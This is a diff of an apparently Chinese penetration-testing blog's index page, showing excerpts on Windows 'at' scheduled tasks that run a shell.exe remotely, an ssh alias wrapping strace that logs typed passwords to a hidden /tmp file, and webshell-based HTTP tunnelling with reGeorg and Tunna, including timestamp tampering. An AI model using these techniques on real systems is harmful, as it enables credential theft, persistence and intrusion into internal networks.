@@ -139,6 +139,72 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/09/23/time-tasks/">
+                win计划任务小记 [ at schtasks ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/schtasks/">schtasks</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>1,关于系统计划任务的一些简单使用,03以前的系统中可使用 at 来执行各种系统计划任务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># at 14:23 /every:18,19,21,24,28 c:\shell.exe  创建本地计划任务,每月的这几号的这个点执行指定的可执行程序</span></div><div class="line"><span class="comment"># at /delete /y 	删除本地所有的计划任务</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># at \\192.168.3.23 14:23 /every:18,19,21,24,28 c:\shell.exe 在远程机器上创建计划任务</span></div><div class="line"><span class="comment"># at \\192.168.3.23 /delete /y 删除远程机器上的所有的计划任务</span></div></pre></td></tr></table></figure>
+        </div>
+        <a href="/2016/09/23/time-tasks/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/22/strace/">
+                利用strace来跟踪在ssh时输入的密码
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/strace/">strace</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>strace本身其实是一个非常好用的系统调用跟踪工具,运维们可以通过它快速锁定问题的根源,但,恰巧我们也可以通过这种方式来跟踪任何进程数据,比如ssh,su,sudo,这里以跟踪密码为例,大家可以自行脑洞更多其它用法,关于strace自身的选项作用,请man:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum install strace 如果目标机器没有装strace,那你就自己顺手给他装一个,不过像这类的调试工具,一般都会作为常用工具而被预装</span></div><div class="line"><span class="comment"># vi ~/.bashrc 注意,这里是当前用户的环境变量配置文件,也就是说它只能对当前用户有效,不过你也可以加到全局配置中 '/etc/bashrc'</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alias</span> ssh=<span class="string">'strace -o /tmp/.sshpwd-`date '</span>+%d%h%m%s<span class="string">'`.log -s 2048 ssh'</span></div></pre></td></tr></table></figure>
+        </div>
+        <a href="/2016/09/22/strace/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/09/21/ssh-portforward/">
                 通向彼岸 之内网代理转发 [ ssh正反向转发及socks代理篇 ]
             </a>
@@ -330,76 +396,6 @@
 <p>0x02 首先,安装好工具所需的各种py依赖库:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> pip install pycrypto    加密库,整个数据加密都要靠这个</span></div><div class="line"><span class="meta">#</span><span class="bash"> pip install httplib2</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2016/09/15/abptts-http-tunnel/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/14/regerog-http-tunnel/">
-                通向彼岸 之内网代理转发 [ http隧道篇 reGeorg ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-14</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/http-tunnel/">http tunnel</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="reGeorg-基于py-实际渗透过程中用的相对较多-稳定性一般-不过-使用还是非常方便的-推荐"><a href="#reGeorg-基于py-实际渗透过程中用的相对较多-稳定性一般-不过-使用还是非常方便的-推荐" class="headerlink" title="reGeorg[基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:"></a>reGeorg[基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:</h5><p><br><br>1,和前面都一样,先把代理(webshell)上传到目标的网站目录中再说,记得顺手改下webshell的时间戳,尝试访问该shell,返回正常后,即可本地执行绑定操作,如下<br><img src="/img/regeorg_weshell.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python regerogsocksproxy.py -u "http://目标域名/tunnel.aspx" -p 绑定的本地端口</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/regeorg_weshell_proxy.png" alt=""><br></p>
-<p>2,连接绑定好的本地端口,推荐用proxifier或者sockscap,然后往里面添加一些自己常用的内网渗透工具,就可以对目标进行正常的内网渗透了<br><img src="/img/regeorg_weshell_proxifier.png" alt=""><br><br><img src="/img/regeorg_weshell_res.png" alt=""><br></p>
-<p>3,实际渗透中,个人还是比较推荐用这个,比较稳定,使用也比较简单,不过,还是有些令人不太愉快的地方,待后期解决了,再单独拿出来说<br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/13/tunna-http-tunnel/">
-                通向彼岸 之内网代理转发 [ http隧道篇 Tunna ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-13</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/http-tunnel/">http tunnel</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="Tunna-实际渗透中-不太推荐-不稳定-经常断-阻塞-基于py编写"><a href="#Tunna-实际渗透中-不太推荐-不稳定-经常断-阻塞-基于py编写" class="headerlink" title="Tunna[实际渗透中,不太推荐,不稳定,经常断,阻塞,基于py编写]:"></a>Tunna[实际渗透中,不太推荐,不稳定,经常断,阻塞,基于py编写]:</h5><p><br><br>1,依然是先把代理端(webshell)上传到目标的网站目录中,并尝试访问该webshell,返回正常后,即可在本地执行下面的语句:<br><img src="/img/tunna_client.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[3389] -v </span></div><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -a 内网机器的ip -r 内网机器的指定端口 -v  </span></div><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[22] -s[转发ssh服务需要加上此选项] -v</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/tunna_server.png" alt=""><br></p>
-<p>2,先连接刚才绑定到的本地端口,在尝试用mstsc,putty等工具进行连接<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mstsc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> 绑定的本地端口</div></pre></td></tr></table></figure></p>
-<p><img src="/img/tunna_server_res.png" alt=""><br><br>3,比较的不稳定,尤其是php脚本,已经不太兼容php5.3以后的版本了,而且还要开启某些模块(socket)支持,利用条件确实有点儿苛刻<br>4,另外,tunna已经有相应的msf模块,也可以选择直接把它加到msf中使用<br><br></p>
-
-        </div>
     
 
 </div>
